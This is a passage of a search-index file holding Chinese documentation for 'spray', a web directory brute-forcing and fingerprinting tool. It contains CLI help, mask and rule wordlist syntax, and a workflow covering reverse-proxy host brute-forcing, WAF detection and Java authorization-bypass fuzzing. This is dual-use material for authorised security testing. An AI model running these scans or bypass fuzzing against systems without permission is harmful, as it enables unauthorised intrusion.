CDN,\u4e2d\u95f4\u4ef6\u7684\u7279\u6b8a header \u5bf9\u7ed3\u679c\u7684\u5f71\u54cd.</li> <li>\u5404\u79cd 403bypass \u624b\u6bb5</li> <li>java \u7684\u6743\u9650\u7ed5\u8fc7\u624b\u6cd5\u600e\u4e48\u81ea\u52a8\u5316</li> <li>CDN/\u53cd\u5411\u4ee3\u7406\u771f\u7684\u53ea\u6709 host \u4e0e path \u4e24\u79cd\u65b9\u5f0f\u53bb\u7206\u7834\u4e48?</li> <li>\u7c7b\u4f3cHaE\u7684\u4fe1\u606f\u6536\u96c6\u80fd\u5728\u76ee\u5f55\u7206\u7834\u4e2d\u8d77\u5230\u4ec0\u4e48\u4f5c\u7528?</li> </ul> <p>\u67d0\u4e9b\u9886\u57df spray \u4e5f\u65e0\u80fd\u4e3a\u529b, \u4f46\u5176\u4e2d\u4e00\u90e8\u5206, \u5c06\u5728 spray \u540e\u7eed\u66f4\u65b0\u4e2d\u5b9e\u73b0.</p> <p>spray \u9762\u4e34\u7684\u573a\u666f\u662f\u548c gogo \u4e00\u6837\u590d\u6742\u7684. \u8fd9\u4e2a\u9886\u57df\u4e0d\u9700\u8981\u6211\u53bb\u5f3a\u8c03\u5176\u91cd\u8981\u6027, \u5728\u6700\u8fd1\u51e0\u5e74\u7684\u7ea2\u84dd\u5bf9\u6297\u4e2d\u5c31\u80fd\u6df1\u523b\u611f\u53d7\u5230. \u5f88\u591a\u65f6\u5019\u771f\u7684\u53ea\u662f\u5de5\u5177\u4e0d\u884c, \u5fc3\u6709\u4f59\u800c\u529b\u4e0d\u8db3. \u9762\u5bf9\u5f88\u591a\u7f51\u7ad9\u53ea\u80fd\u4e00\u904d\u904d\u7684\u53bb\u9488\u5bf9\u6027\u7684\u7f16\u5199\u4e00\u4e2a python \u811a\u672c, \u5c31\u50cf\u5199 exp \u4e00\u6837. spray \u662f\u4e3a\u4e86\u89e3\u51b3\u8fd9\u6837\u7684\u95ee\u9898\u8bbe\u8ba1, \u5e76\u6253\u78e8\u4e86\u5c0f\u534a\u5e74.</p> <p>\u6709\u8c01\u4f1a\u53bb\u5728\u4e00\u4e2a\u9879\u76ee\u4e2d\u7206\u7834\u51e0\u5343\u4e2a nginx \u5462?</p>"},{"location":"spray/design/#todo","title":"todo","text":"<p>\u8fd9\u4e9b\u5176\u4ed6\u65b9\u5f0f\u6709\u4e9b\u4e0e spray \u7684\u8bbe\u8ba1\u51b2\u7a81, \u6709\u4e9b\u53ea\u662f\u6682\u65f6\u6ca1\u6709\u597d\u7684\u89e3\u51b3\u529e\u6cd5. \u6709\u4e9b\u662f\u56e0\u4e3a\u6211\u7684\u65f6\u95f4\u6709\u9650, \u8fd8\u4f4d\u4e8e todo \u4e4b\u4e2d..</p> <ul> <li>\u5404\u79cd 403bypass \u4e0e java \u6743\u9650\u7ed5\u8fc7\u5c06\u4f1a\u4ee5 rule \u7684\u5f62\u5f0f\u5b9e\u73b0.</li> <li>HaE \u7684\u4e00\u4e9b\u89c4\u5219\u4e0e nuclei \u4e2d\u7684exposures\u5c06\u4f1a\u4e00\u8d77\u4ee5\u63d2\u4ef6\u7684\u5f62\u5f0f\u52a0\u5165 spray</li> <li>ffuf \u4e2d\u7684\u4e00\u4e9b fuzz \u6280\u672f\u5c06\u4f1a\u7ecf\u8fc7\u91cd\u65b0\u8bbe\u8ba1\u540e\u52a0\u5165 spray, \u5b9a\u4f4d\u4e5f\u4e0e ffuf \u539f\u672c\u7684\u8bbe\u8ba1\u6709\u4e9b\u8bb8\u4e0d\u540c</li> <li>yakit \u4e2d\u7684 fuzztag \u4e5f\u503c\u5f97\u53c2\u8003, \u4e0e mask \u548c rule \u7ed3\u5408\u80fd\u521b\u9020\u51fa\u4e0d\u5c11\u65b0\u73a9\u6cd5. \u6216\u8bb8\u80fd\u89e3\u51b3\u66f4\u591a\u95ee\u9898</li> </ul> <p>(\u8fd9\u91cc\u5c31\u4e0d\u4f7f\u7528 tasklist \u4e86, \u6bcf\u5b9e\u73b0\u4e00\u90e8\u5206\u5c31\u4f1a\u5728 todo \u4e2d\u5220\u9664, \u8f6c\u5316\u4e3a\u6587\u6863)</p>"},{"location":"spray/do/","title":"spray (\u5185\u90e8\u6d4b\u8bd5) \u00b7 \u5b9e\u6218","text":""},{"location":"spray/do/#\u6700\u5e38\u7528\u7684\u5de5\u4f5c\u6d41","title":"\u6700\u5e38\u7528\u7684\u5de5\u4f5c\u6d41","text":""},{"location":"spray/do/#step1-\u5e38\u89c1\u76ee\u5f55\u5b57\u5178\u626b\u63cf","title":"step1 \u5e38\u89c1\u76ee\u5f55\u5b57\u5178\u626b\u63cf","text":"<p>\u5e38\u89c1\u76ee\u5f55\u5b57\u5178\u6765\u6e90\u4e92\u8054\u7f51\u4e0a\u6709\u4e0d\u5c11, \u4f46\u5927\u591a\u7f3a\u4e4f\u7ef4\u62a4\u66f4\u65b0. \u9700\u8981\u4f7f\u7528\u8005\u81ea\u884c\u7ec4\u5408\u4e00\u4e2a\u9002\u5408\u81ea\u5df1\u7684\u5b57\u5178.</p> <p><code>spray -u http://example.com -d common.txt -a</code></p> <p>\u4f7f\u7528spray\u6253\u5f00\u6240\u6709\u63d2\u4ef6(\u5305\u62ec\u722c\u866b, \u901a\u7528\u6587\u4ef6, \u5907\u4efd\u6587\u4ef6, \u4fe1\u606f\u6536\u96c6\u7b49), \u8fdb\u884c\u4e00\u6b21\u5b8c\u6574\u7684\u7f51\u7ad9\u4fe1\u606f\u6536\u96c6</p> <p>\u4f46\u5982\u679c\u9762\u5bf9\u4e00\u4e2a404\u9875\u9762\u7684nginx\u670d\u52a1\u5668, \u8fd9\u79cd\u65b9\u5f0f\u5927\u6982\u7387\u6536\u96c6\u4e0d\u5230\u4efb\u4f55\u4fe1\u606f, \u9700\u8981\u4f7f\u7528\u5176\u4ed6\u65b9\u6cd5.</p>"},{"location":"spray/do/#step2-\u5bf9\u4e8e\u53cd\u4ee3\u7684\u63a2\u6d4b","title":"step2 \u5bf9\u4e8e\u53cd\u4ee3\u7684\u63a2\u6d4b","text":"<p>\u5bf9\u53cd\u4ee3\u4e00\u822c\u6709\u4e24\u79cd\u65b9\u5f0f</p> <p>host\u7206\u7834</p> <p>\u901a\u8fc7\u5b50\u57df\u540d\u6570\u636e, \u5c06\u5b50\u57df\u540d\u4f5c\u4e3a\u5b57\u5178, \u7206\u7834\u5176\u53cd\u4ee3\u7684host\u914d\u7f6e</p> <p><code>spray -u http://example.com -m host -d subdomain.txt</code></p> <p>\u968f\u673a\u76ee\u5f55\u7206\u7834</p> <p>\u901a\u8fc7spray\u7684\u5b57\u5178\u751f\u6210\u5668, \u751f\u6210\u4e00\u4e9b\u5e38\u7528\u7684\u968f\u673a\u5b57\u5178, \u8fdb\u884c\u7206\u7834.</p> <p><code>spray -u http://example.com -w '{$l#4}' -a</code></p> <p>1-4\u4f4d\u968f\u673a\u5c0f\u5199\u76ee\u5f55\u662f\u6bd4\u8f83\u5e38\u89c1\u7684\u914d\u7f6e, \u5728\u5f88\u591a\u9879\u76ee\u4e2d\u90fd\u627e\u5230\u4e86\u60ca\u559c.</p> <p>\u6839\u636e\u4e00\u4e9b\u5176\u4ed6\u6765\u6e90\u7684\u4fe1\u606f, \u4f8b\u5982\u88ab\u52a8\u7684url\u6536\u96c6, \u53d1\u73b0\u53cd\u4ee3\u8def\u7531\u7684\u547d\u540d\u89c4\u5f8b, \u4f7f\u7528spray\u7684\u5b57\u5178\u751f\u6210\u5668\u6784\u9020\u5bf9\u5e94\u7684\u5b57\u5178, \u80fd\u53d1\u73b0\u66f4\u591a\u5185\u5bb9. </p>"},{"location":"spray/do/#step3-java\u6743\u9650\u7ed5\u8fc7\u7684\u63a2\u6d4b","title":"step3 java\u6743\u9650\u7ed5\u8fc7\u7684\u63a2\u6d4b","text":"<p>\u4ece\u5176\u4ed6\u6e20\u9053\u626b\u63cf\u7684\u7ed3\u679c\u4e2d, \u5c06\u4e2d\u95f4\u4ef6\u6216\u8bed\u8a00\u4e3ajava\u76f8\u5173\u7684\u7ed3\u679c\u5bfc\u51fa, \u91cd\u590d1-2\u6b65\u9aa4. \u7136\u540e\u53ef\u4ee5\u5f97\u5230\u4e00\u6279url.</p> <p>\u518d\u5c06\u8fd9\u6279url\u91c7\u7528spray\u7684append-rule\u53bb\u751f\u6210\u5bf9\u5e94\u7684\u6743\u9650\u7ed5\u8fc7payload, fuzz\u662f\u5426\u53ef\u80fd\u5b58\u5728\u6743\u9650\u7ed5\u8fc7.</p> <p><code>spray -l 1.txt --append-rule authbypass --recon</code></p>"},{"location":"spray/do/#\u4f7f\u7528\u573a\u666f","title":"\u4f7f\u7528\u573a\u666f","text":"<p>\u4e3a\u4e86\u66f4\u597d\u7684\u4ecb\u7ecdspray\u7684\u529f\u80fd, \u6848\u4f8b\u4e2d\u5c06\u4f1a\u5305\u542b\u4e00\u5b9a\u7684\u6f14\u7ece\u6210\u5206. </p>"},{"location":"spray/do/#\u573a\u666f1-\u53cd\u4ee3\u4e2d\u95f4\u4ef6","title":"\u573a\u666f1 \u53cd\u4ee3\u4e2d\u95f4\u4ef6","text":""},{"location":"spray/do/#\u573a\u666f2-\u67d0cms","title":"\u573a\u666f2 \u67d0CMS","text":""},{"location":"spray/do/#\u573a\u666f3-cdn","title":"\u573a\u666f3 CDN","text":""},{"location":"spray/do/#\u7279\u6b8a\u573a\u666f","title":"\u7279\u6b8a\u573a\u666f","text":""},{"location":"spray/do/#\u9632\u62a4\u9003\u9038","title":"\u9632\u62a4\u9003\u9038","text":"<p>todo</p>"},{"location":"spray/start/","title":"spray \u00b7 \u5165\u95e8","text":""},{"location":"spray/start/#feature","title":"Feature","text":"<p>Features.</p> <ul> <li>\u8d85\u5f3a\u7684\u6027\u80fd, \u5728\u672c\u5730\u6d4b\u8bd5\u6781\u9650\u6027\u80fd\u7684\u573a\u666f\u4e0b, \u80fd\u8d85\u8fc7 ffuf \u4e0e feroxbruster \u7684\u6027\u80fd 50%\u4ee5\u4e0a.</li> <li>\u57fa\u4e8e\u63a9\u7801\u7684\u5b57\u5178\u751f\u6210</li> <li>\u57fa\u4e8e\u89c4\u5219\u7684\u5b57\u5178\u751f\u6210</li> <li>\u52a8\u6001\u667a\u80fd\u8fc7\u6ee4</li> <li>\u5168\u91cf gogo \u7684\u6307\u7eb9\u8bc6\u522b</li> <li>\u81ea\u5b9a\u4e49\u4fe1\u606f\u63d0\u53d6, \u5982 ip,js, title, hash \u4ee5\u53ca\u81ea\u5b9a\u4e49\u7684\u6b63\u5219\u8868\u8fbe\u5f0f</li> <li>\u81ea\u5b9a\u4e49\u65e0\u6548\u9875\u9762\u8fc7\u6ee4\u7b56\u7565</li> <li>\u81ea\u5b9a\u4e49\u8f93\u51fa\u683c\u5f0f * _nix \u7684\u547d\u4ee4\u884c\u8bbe\u8ba1, \u8f7b\u677e\u4e0e\u5176\u4ed6\u5de5\u5177\u8054\u52a8</li> <li>\u591a\u89d2\u5ea6\u7684\u81ea\u52a8\u88ab ban,\u88ab waf \u5224\u65ad</li> <li>\u65ad\u70b9\u7eed\u4f20</li> <li>\u901a\u7528\u6587\u4ef6, \u5907\u4efd\u6587\u4ef6, \u5355\u4e2a\u6587\u4ef6\u5907\u4efd, \u722c\u866b, \u4e3b\u52a8\u6307\u7eb9\u8bc6\u522b\u7684\u5b8c\u7f8e\u7ed3\u5408</li> </ul>"},{"location":"spray/start/#usage","title":"Usage","text":"<p><code>spray -h</code></p> <p>\u5b8c\u6574\u7684\u53c2\u6570\u8bf4\u660e</p> <pre><code>Usage:\n    ./spray\n\nInput Options:\n      --resume=                     File, resume filename\n  -c, --config=                     File, config filename\n  -u, --url=                        Strings, input baseurl, e.g.: http://google.com\n  -l, --list=                       File, input filename\n  -p, --port=                       String, input port range, e.g.: 80,8080-8090,db\n  -i, --cidr=                       String, input cidr, e.g.: 1.1.1.1/24\n      --raw=                        File, input raw request filename\n  -d, --dict=                       Files, Multi,dict files, e.g.: -d 1.txt -d 2.txt\n  -D, --default                     Bool, use default dictionary\n  -w, --word=                       String, word generate dsl, e.g.: -w test{?ld#4}\n  -r, --rules=                      Files, rule files, e.g.: -r rule1.txt -r rule2.txt\n      --append-rule=                Files, when found valid path , use append rule generator new word with current path\n      --filter-rule=                String, filter rule, e.g.: --rule-filter '&gt;8 &lt;4'\n      --append=                     Files, when found valid path , use append file new word with current path\n      --offset=                     Int, wordlist offset\n      --limit=                      Int, wordlist limit, start with offset. e.g.: --offset 1000 --limit 100\n\nFunction Options:\n  -e, --extension=                  String, add extensions (separated by commas), e.g.: -e jsp,jspx\n      --force-extension             Bool, force add extensions\n      --exclude-extension=          String, exclude extensions (separated by commas), e.g.: --exclude-extension jsp,jspx\n      --remove-extension=           String, remove extensions (separated by commas), e.g.: --remove-extension jsp,jspx\n  -U, --uppercase                   Bool, upper wordlist, e.g.: --uppercase\n  -L, --lowercase                   Bool, lower wordlist, e.g.: --lowercase\n      --prefix=                     Strings, add prefix, e.g.: --prefix aaa --prefix bbb\n      --suffix=                     Strings, add suffix, e.g.: --suffix aaa --suffix bbb\n      --replace=                    Strings, replace string, e.g.: --replace aaa:bbb --replace ccc:ddd\n      --skip=                       String, skip word when generate. rule, e.g.: --skip aaa\n\nOutput Options:\n      --match=                      String, custom match function, e.g.: --match 'current.Status != 200''\n      --filter=                     String, custom filter function, e.g.: --filter 'current.Body contains \"hello\"'\n      --fuzzy                       String, open fuzzy output\n  -f, --file=                       String, output filename\n      --dump-file=                  String, dump all request, and write to filename\n      --dump                        Bool, dump all request\n      --auto-file                   Bool, auto generator output and fuzzy filename\n  -F, --format=                     String, output format, e.g.: --format 1.json\n  -j, --json                        Bool, output json\n  -O, --file-output                 String, file output format, json/csv\n  -o, --probe=                      String, output format\n  -q, --quiet                       Bool, Quiet\n      --no-color                    Bool, no color\n      --no-bar                      Bool, No progress bar\n      --no-stat                     Bool, No stat file output\n\nPlugin Options:\n  -a, --advance                     Bool, enable all plugin\n      --extract=                    Strings, extract response, e.g.: --extract js --extract ip --extract version:(.*?)\n      --extract-config=             String, extract config filename\n      --active                      Bool, enable active finger path\n      --recon                       Bool, enable recon\n      --bak                         Bool, enable bak found\n      --common                      Bool, enable common file found\n      --crawl                       Bool, enable crawl\n      --crawl-depth=                Int, crawl depth (default: 3)\n\nFinger Options:\n      --finger                      Bool, enable active finger detect\n      --update                      Bool, update finger database\n      --finger-path=                String, 3rd finger config path (default: fingers)\n      --finger-engine=              String, custom finger engine, e.g. --finger-engine ehole,goby (default: all)\n\nRequest Options:\n  -x, --method=                     String, request method, e.g.: --method POST (default: GET)\n      --header=                     Strings, custom headers, e.g.: --headers 'Auth: example_auth'\n      --user-agent=                 String, custom user-agent, e.g.: --user-agent Custom\n      --random-agent                Bool, use random with default user-agent\n      --cookie=                     Strings, custom cookie\n      --read-all                    Bool, read all response body\n      --max-length=                 Int, max response body length (kb), -1 read-all, 0 not read body, default 100k, e.g. --max-length 1000 (default: 100)\n\nModify Options:\n      --rate-limit=                 Int, request rate limit (rate/s), e.g.: --rate-limit 100 (default: 0)\n      --force                       Bool, skip error break\n      --no-scope                    Bool, no scope\n      --scope=                      String, custom scope, e.g.: --scope *.example.com\n      --recursive=                  String,custom recursive rule, e.g.: --recursive current.IsDir() (default: current.IsDir())\n      --depth=                      Int, recursive depth (default: 0)\n      --index=                      String, custom index path (default: /)\n      --random=                     String, custom random path\n      --check-period=               Int, check period when request (default: 200)\n      --error-period=               Int, check period when error (default: 10)\n      --error-threshold=            Int, break when the error exceeds the threshold (default: 20)\n      --black-status=               Strings (comma split),custom black status (default: 400,410)\n      --white-status=               Strings (comma split), custom white status (default: 200)\n      --fuzzy-status=               Strings (comma split), custom fuzzy status (default: 500,501,502,503,301,302)\n      --unique-status=              Strings (comma split), custom unique status (default: 403,200,404)\n      --unique                      Bool, unique response\n      --retry=                      Int, retry count (default: 0)\n      --sim-distance=\n\nMiscellaneous Options:\n  -m, --mod=[path|host]             String, path/host spray (default: path)\n  -C, --client=[fast|standard|auto] String, Client type (default: auto)\n      --deadline=                   Int, deadline (seconds) (default: 999999)\n  -T, --timeout=                    Int, timeout with request (seconds) (default: 5)\n  -P, --pool=                       Int, Pool size (default: 5)\n  -t, --thread=                     Int, number of threads per pool (default: 20)\n      --debug                       Bool, output debug info\n      --version                     Bool, show version\n  -v                                Bool, log verbose level ,default 0, level1: -v level2 -vv\n      --proxy=                      String, proxy address, e.g.: --proxy socks5://127.0.0.1:1080\n      --init                        Bool, init config file\n      --print                       Bool, print preset all preset config\n\nHelp Options:\n  -h, --help                        Show this help message\n</code></pre>"},{"location":"spray/start/#quickstart","title":"QuickStart","text":"<p>\u5f53\u524d\u6709\u4e24\u79cd\u8fd0\u884c\u6a21\u5f0f, \u7206\u7834\u6a21\u5f0f\u548c\u57fa\u672c\u6a21\u5f0f.  \u8fd9\u4e24\u79cd\u6a21\u5f0f\u4f1a\u81ea\u52a8\u5207\u6362, \u4e0d\u9700\u8981\u7528\u6237\u624b\u52a8\u6307\u5b9a\u3002 </p> <p>\u6240\u6709\u9700\u8981\u57fa\u7ebf\u8fdb\u884c\u667a\u80fd\u8fc7\u6ee4\u7684\u529f\u80fd\u90fd\u4f1a\u6253\u5f00\u7206\u7834\u6a21\u5f0f, \u4e0d\u9700\u8981\u4e0a\u4e0b\u6587\u7684\u529f\u80fd\u4f1a\u4f7f\u7528\u57fa\u672c\u4fe1\u606f\u6536\u96c6\u6a21\u5f0f </p>"},{"location":"spray/start/#\u57fa\u672c\u4fe1\u606f\u63a2\u6d4b","title":"\u57fa\u672c\u4fe1\u606f\u63a2\u6d4b","text":"<p>\u6307\u5b9aurl\u8fdb\u884c\u63a2\u6d4b</p> <pre><code>spray -u http://example.com -u http://test.com\n</code></pre> <p>\u901a\u8fc7\u6587\u4ef6\u6279\u91cf\u6307\u5b9aurl</p> <pre><code>spray -l 1.txt\n</code></pre> <p>\u6700\u5927\u80fd\u529b\u7684\u4fe1\u606f\u6536\u96c6, \u6253\u5f00\u5168\u90e8\u6307\u7eb9\u5f15\u64ce, \u6253\u5f00\u5168\u90e8\u914d\u7f6e\u7684extractor</p> <pre><code>spray -l 1.txt --finger --recon\n</code></pre> <p>\u7aef\u53e3\u626b\u63cf\u4e0e\u7f51\u6bb5\u626b\u63cf</p> <p>\u53ef\u4ee5\u5b9e\u73b0\u7c7b\u4f3cgogo\u7684\u914d\u7f6e, \u4f46\u662f\u662f\u53ea\u80fd\u7528\u6765\u8bc6\u522bhttp\u534f\u8bae</p> <pre><code>spray -i 1.1.1.1/24 -p top2\n</code></pre> <p>\u57df\u540d+\u7aef\u53e3\u7684\u63a2\u6d4b</p> <pre><code>spray -u example.com -p top2\n</code></pre>"},{"location":"spray/start/#\u7206\u7834\u6a21\u5f0f","title":"\u7206\u7834\u6a21\u5f0f","text":"<p>\u6ce8\u610f</p> <p>\u57fa\u672c\u4fe1\u606f\u63a2\u6d4b\u4e2d\u7684\u7528\u6cd5\u90fd\u53ef\u4ee5\u5728\u7206\u7834\u6a21\u5f0f\u4e2d\u4f7f\u7528, \u4f46\u8bf7\u6ce8\u610f\u7206\u7834\u6a21\u5f0f\u4f1a\u6d88\u8017\u66f4\u591a\u7684\u8d44\u6e90</p> <p>\u57fa\u672c\u4f7f\u7528, \u4ece\u5b57\u5178\u4e2d\u8bfb\u53d6\u76ee\u5f55\u8fdb\u884c\u7206\u7834</p> <pre><code>spray -u http://example.com -d wordlist1.txt -d wordlist2.txt\n</code></pre> <p>\u901a\u8fc7\u63a9\u7801\u751f\u6210\u5b57\u5178\u8fdb\u884c\u7206\u7834</p> <pre><code>spray -u http://example.com -w \"/aaa/bbb{?l#4}/ccc\"\n</code></pre> <p>\u901a\u8fc7\u89c4\u5219\u751f\u6210\u5b57\u5178\u7206\u7834. \u89c4\u5219\u6587\u4ef6\u683c\u5f0f\u53c2\u8003 hashcat \u7684\u5b57\u5178\u751f\u6210\u89c4\u5219</p> <pre><code>spray -u http://example.com -r rule.txt -d 1.txt\n</code></pre> <p>\u6279\u91cf\u7206\u7834</p> <pre><code>spray -l url.txt -r rule.txt -d 1.txt\n</code></pre> <p>\u65ad\u70b9\u7eed\u4f20</p> <pre><code>spray --resume stat.json\n</code></pre> <p>host\u7206\u7834</p> <pre><code>spray -m host -u http://123.123.123.123 -w \"{?0}.example.com\" -d 1.txt\n</code></pre> <p>1.txt:</p> <pre><code>aaa\nbbb\nccc\n...\n</code></pre>"},{"location":"spray/start/#\u5b57\u5178\u751f\u6210","title":"\u5b57\u5178\u751f\u6210","text":""},{"location":"spray/start/#\u5185\u7f6e\u5b57\u5178","title":"\u5185\u7f6e\u5b57\u5178","text":"<p>\u5728v1.1.0\u4e2d, spray\u65b0\u52a0\u5165\u4e86\u5185\u7f6e\u5b57\u5178\u76f8\u5173\u529f\u80fd. </p> <p>\u5185\u7f6e\u5b57\u5178\u7684\u914d\u7f6e\u4f4d\u4e8e https://github.com/chainreactors/templates/tree/master/spray/dict</p> <p>(\u539f\u5148\u7684common\u5df2\u7ecf\u4ece<code>common.yaml</code>\u4e2d\u8fc1\u79fb\u5230dict\u4e2d)</p> <p>\u53ef\u4ee5\u4f7f\u7528<code>--print</code>\u770b\u5230\u5f53\u524d\u6240\u6709\u5f53\u524d\u5185\u7f6e\u7684\u914d\u7f6e. </p> <p></p> <p>\u6ce8\u610f\u5185\u7f6e\u5b57\u5178\u540d\u5b57</p> <p>\u4f7f\u7528\u5185\u7f6e\u5b57\u5178\u65f6, \u4e0d\u53ef\u4ee5\u5e26\u540e\u7f00\u540d\u7528\u6765\u4e0e\u7528\u6237\u81ea\u5b9a\u4e49\u5b57\u5178\u533a\u5206. \u4f8b\u5982dict\u76ee\u5f55\u4e0b\u914d\u7f6e\u4e3a<code>js.txt</code>, \u5728\u4f7f\u7528\u65f6\u8bf7\u4f7f\u7528<code>-d js</code></p> <p>\u53ef\u4ee5\u540c\u65f6\u4f7f\u7528\u591a\u4e2a\u5185\u7f6e\u5b57\u5178\u4e0e\u5916\u90e8\u5b57\u5178\u7ec4\u5408\u4f8b\u5982: </p> <p><code>spray -u http://example.txt -d js -d k8s -d custom.txt</code></p>"},{"location":"spray/start/#\u57fa\u4e8e\u63a9\u7801\u7684\u5b57\u5178\u751f\u6210","title":"\u57fa\u4e8e\u63a9\u7801\u7684\u5b57\u5178\u751f\u6210","text":"<p>\u4e3a\u4e86\u5b9e\u73b0\u8fd9\u4e2a\u529f\u80fd, \u7f16\u5199\u4e86\u4e00\u95e8\u540d\u4e3a mask \u7684\u6a21\u677f\u8bed\u8a00. \u4ee3\u7801\u4f4d\u4e8e: mask.</p> <p>\u7b80\u5355\u4f7f\u7528: </p> <p><code>spray -u http://example.com -w '/{?l#3}/{?ud#3}</code></p> <p>\u542b\u4e49\u4e3a, <code>/\u5168\u90e8\u4e09\u4f4d\u5c0f\u5199\u5b57\u6bcd/\u5168\u90e8\u4e09\u4f4d\u5927\u5199\u5b57\u6bcd+\u6570\u5b57</code>\u7ec4\u6210\u7684\u5b57\u5178.</p>"},{"location":"spray/start/#\u8bed\u6cd5\u57fa\u672c\u4ecb\u7ecd","title":"\u8bed\u6cd5\u57fa\u672c\u4ecb\u7ecd","text":"<p>\u6240\u6709\u7684 mask \u751f\u6210\u5668\u90fd\u9700\u8981\u901a\u8fc7<code>{}</code>\u5305\u88f9, \u5e76\u4e14\u62ec\u53f7\u5185\u7684\u7b2c\u4e00\u4e2a\u5b57\u7b26\u5fc5\u987b\u4e3a<code>?</code>, <code>$</code>\u5176\u4e2d\u4e4b\u4e00.</p> <p><code>#</code>\u540e\u7684\u6570\u5b57\u8868\u793a\u91cd\u590d\u6b21\u6570, \u53ef\u7559\u7a7a, \u4f8b\u5982<code>{?lu}</code> , \u8868\u793a\"\u5168\u90e8\u5c0f\u5199\u5b57\u6bcd+\u5168\u90e8\u5927\u5199\u5b57\u6bcd\"\u7ec4\u6210\u7684\u5b57\u5178.</p> <ul> <li><code>?</code> \u8868\u793a\u666e\u901a\u7684\u7b1b\u5361\u5c14\u79ef. \u4f8b\u5982<code>{?l#3}</code>\u8868\u793a\u751f\u6210\u4e09\u4f4d\u5c0f\u5199\u5b57\u6bcd\u7684\u6240\u6709\u53ef\u80fd\u7ec4\u5408</li> <li><code>$</code> \u8868\u793a\u8d2a\u5a6a\u6a21\u5f0f, \u4f8b\u5982<code>{$l#3}</code>\u8868\u793a 3 \u4f4d\u5c0f\u5199\u5b57\u6bcd\u7684\u6240\u6709\u53ef\u80fd\u7ec4\u5408+2 \u4f4d\u5c0f\u5199\u5b57\u6bcd\u7684\u6240\u6709\u53ef\u80fd\u7ec4\u5408+1 \u4f4d\u5c0f\u5199\u5b57\u6bcd\u7684\u6240\u6709\u53ef\u80fd\u7ec4\u5408</li> </ul> <p>\u63a9\u7801\u7684\u5b9a\u4e49\u53c2\u8003\u4e86 hashcat, \u4f46\u662f\u5e76\u4e0d\u5b8c\u5168\u76f8\u540c. \u76ee\u524d\u53ef\u7528\u7684\u5173\u952e\u5b57\u5982\u4e0b\u8868:</p> <pre><code>\"l\": Lowercase,  // 26\u4e2a\u5c0f\u5199\u5b57\u6bcd\n\"u\": Uppercase,  // 26\u4e2a\u5927\u5199\u5b57\u6bcd\n\"w\": Letter,     // 52\u5927\u5199+\u5c0f\u5199\u5b57\u6bcd\n\"d\": Digit, // \u6570\u5b570-9\n\"h\": LowercaseHex, // \u5c0f\u5199hex\u5b57\u7b26, 0-9 + a-f\n\"H\": UppercaseHex, // \u5927\u5199hex\u5b57\u7b26, 0-9 + A-F\n\"x\": Hex,          // \u5927\u5199+\u5c0f\u5199hex\u5b57\u7b26, 0-9 + a-f + A-F\n\"p\": Punctuation,  // \u7279\u6b8a\u5b57\u7b26 !\\\"#$%&amp;'()*+,-./:;&lt;=&gt;?@[\\\\]^_`{|}~\n\"P\": Printable,    // \u53ef\u89c1\u7684ascii\u5b57\u7b26\n\"s\": Whitespace,   // \u7a7a\u5b57\u7b26 \\t\\n\\r\\x0b\\x0c\n</code></pre> <p>\u652f\u6301\u901a\u8fc7\u6570\u5b57\u8868\u793a\u547d\u4ee4\u884c\u8f93\u5165\u7684\u5b57\u5178\u5e8f\u53f7, \u4f8b\u5982</p> <pre><code>spray -u http://example.com -w '/{?0u#2}/{?01}' -d word0.txt -d word1.txt\n</code></pre> <p>\u8fd9\u91cc\u914d\u7f6e\u4e86\u4e24\u4e2a\u63a9\u7801\u751f\u6210\u5668</p> <ul> <li>\u7b2c\u4e00\u4e2a: <code>{?0u#2}</code>\u8868\u793a word0.txt \u7684\u6240\u6709\u5185\u5bb9+\u6240\u6709\u5927\u5199\u5b57\u6bcd\u7b1b\u5361\u5c14\u79ef\u4e24\u6b21</li> <li>\u7b2c\u4e8c\u4e2a: <code>{?01}</code> \u8868\u793a word0.txt + word1.txt \u7684\u6240\u6709\u5185\u5bb9.</li> </ul> <p>\u53ef\u4ee5\u914d\u7f6e\u4efb\u610f\u591a\u4e2a\u63a9\u7801\u751f\u6210\u5668, \u4e0d\u540c\u63a9\u7801\u751f\u6210\u5668\u4e4b\u95f4\u4f1a\u8fdb\u884c\u7b1b\u5361\u5c14\u79ef, \u6240\u4ee5\u8bf7\u6ce8\u610f\u5b57\u5178\u5927\u5c0f.</p> <p><code>-d</code>\u4e0e\u57fa\u4e8e\u63a9\u7801\u7684\u751f\u6210\u5668\u4ea4\u4e92\u4f5c\u7528</p> <p>\u5728\u4f7f\u7528<code>-d</code> \u6307\u5b9a\u5b57\u5178(\u4e0d\u7ba1\u662f\u5185\u7f6e\u5b57\u5178\u8fd8\u662f\u81ea\u5b9a\u4e49\u5b57\u5178) \u90fd\u4f1a\u5c06\u8fd9\u4e2a\u5b57\u5178\u6ce8\u518c\u5230\u63a9\u7801\u7684\u6570\u5b57\u4e2d. \u5c31\u50cf\u4e0a\u6587\u4e2d\u51fa\u73b0\u7684<code>{?01}</code>, \u4f1a\u6309\u6b21\u5e8f\u89e3\u6790\u4e3aword0.txt + word1.txt</p> <p>\u5173\u4e8emask\u66f4\u591a\u9ad8\u7ea7\u529f\u80fd\u8bf7\u89c1: https://chainreactors.github.io/wiki/libs/words/#20240521-updatec</p>"},{"location":"spray/start/#\u57fa\u4e8e\u89c4\u5219\u7684\u5b57\u5178\u751f\u6210","title":"\u57fa\u4e8e\u89c4\u5219\u7684\u5b57\u5178\u751f\u6210","text":"<p>words \u751f\u6210\u5668\u7684\u8be6\u7ec6\u4f7f\u7528\u53c2\u89c1words \u6587\u6863</p> <p>\u5f53\u524d\u5185\u7f6e\u7684 spray \u89c4\u5219\u5982\u4e0b:</p> <ul> <li>\u81ea\u52a8\u751f\u6210\u6743\u9650\u7ed5\u8fc7 \u70b9\u51fb\u67e5\u770b\u89c4\u5219</li> <li>\u81ea\u52a8\u751f\u6210\u6587\u4ef6/\u76ee\u5f55\u5907\u4efd \u70b9\u51fb\u67e5\u770b\u89c4\u5219</li> </ul> <p>\u7b80\u5355\u4f7f\u7528</p> <pre><code>spray -u http://example.com -d word.txt -r rule.txt\n</code></pre> <p>\u8fd9\u884c\u547d\u4ee4\u8868\u793a, \u5c06<code>word.txt</code>\u4e2d\u6bcf\u4e00\u884c\u90fd\u4f5c\u4e3a\u57fa\u7840\u503c\u4e0e\u89c4\u5219\u5e93<code>rule.txt</code>\u8fdb\u884c rule \u6a21\u677f\u8bed\u8a00\u5904\u7406\u8fc7\u540e\u7684\u7b1b\u5361\u5c14\u79ef. \u6700\u7ec8\u7684\u5b57\u5178\u603b\u6570\u91cf\u4e3a <code>word\u884c\u6570 * rule\u884c\u6570</code>.</p> <p>rule\u8fc7\u6ee4\u5668</p> 